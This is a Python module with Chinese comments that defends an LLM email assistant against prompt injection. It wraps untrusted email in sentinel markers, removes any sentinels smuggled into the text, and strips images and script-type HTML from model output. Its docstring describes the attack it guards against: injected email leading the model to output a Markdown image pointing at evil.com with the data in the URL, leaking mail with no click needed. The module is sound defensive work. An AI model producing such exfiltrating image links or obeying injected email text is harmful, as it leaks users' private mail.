"""提示注入防御：不可信数据框定 + LLM 输出 Markdown 净化。

背景：LLM 会读到不可信的邮件正文。攻击者可借提示注入诱导模型输出远程图片
语法（![...](https://evil.com/log?d=<数据>)）；浏览器渲染时零点击自动发出
该请求，构成用户邮件数据外泄通道。本模块只做两件事：

1. wrap_untrusted：把邮件内容用结构哨兵包裹，并先删除内容里自带的哨兵串，
   防止攻击者提前闭合数据块、把后续内容伪装成系统指令越狱；
2. strip_markdown_media：净化 LLM 产出的 Markdown，移除一切图片语法与危险
   HTML 元素。为不留下绕过口子，代码块内部也一并净化——宁可损失一点保真度。
"""
from __future__ import annotations

import re

UNTRUSTED_BEGIN = "<<<UNTRUSTED_EMAIL_BEGIN>>>"
UNTRUSTED_END = "<<<UNTRUSTED_EMAIL_END>>>"

# 引用式链接/图片定义行：[ref]: <url>
_REF_DEF_LINE = re.compile(r"^\s*\[[^\]]*\]:\s*\S.*$", re.MULTILINE)
# 行内图片 ![alt](url ...)（url 内允许一层括号）
_INLINE_IMAGE = re.compile(r"!\[[^\]]*\]\([^()]*(?:\([^()]*\)[^()]*)*\)")
# 引用式图片 ![alt][ref]
_REF_IMAGE = re.compile(r"!\[[^\]]*\]\[[^\]]*\]")
# 危险 HTML 元素（含闭合标签与其间内容；未闭合的单独剔除标签本身）
_DANGEROUS_HTML = re.compile(
    r"</?(?:script|iframe|object|embed|svg)\b[^>]*>.*?</(?:script|iframe|object|embed|svg)\s*>"
    r"|</?(?:script|iframe|object|embed|svg)\b[^>]*>",
    re.DOTALL | re.IGNORECASE,
)
# img 标签（无内容元素，单独处理）
_IMG_TAG = re.compile(r"</?img\b[^>]*>", re.IGNORECASE)


def wrap_untrusted(text: str) -> str:
    """把不可信文本包进结构哨兵。

    包之前先删除文本中出现的哨兵串本身——否则攻击者可以在正文里写下
    <<<UNTRUSTED_EMAIL_END>>> 提前闭合数据块，把后续内容冒充成新的指令。
    """
    cleaned = (text or "").replace(UNTRUSTED_BEGIN, "").replace(UNTRUSTED_END, "")
    return f"{UNTRUSTED_BEGIN}\n{cleaned}\n{UNTRUSTED_END}"


def strip_markdown_media(md: str) -> str:
    """净化 LLM 产出的 Markdown：移除一切图片与危险 HTML 元素。

    移除：
    - 行内图片 ![alt](url)、引用式图片 ![alt][ref] 及其引用定义行；
    - 原始 HTML 标签 <img>/<script>/<iframe>/<object>/<embed>/<svg>
      （含闭合标签与内容）。
    保留：
    - 普通链接 [text](url)——需用户主动点击，前端渲染另有 rel 防护；
    - 其余正文。

    注意：为不留下绕过口子，代码块（fenced code block）内部同样净化，
    保真度上的损失是可接受的取舍。
    """
    out = _DANGEROUS_HTML.sub("", md or "")
    out = _IMG_TAG.sub("", out)
    out = _INLINE_IMAGE.sub("", out)
    out = _REF_IMAGE.sub("", out)
    out = _REF_DEF_LINE.sub("", out)
    return out
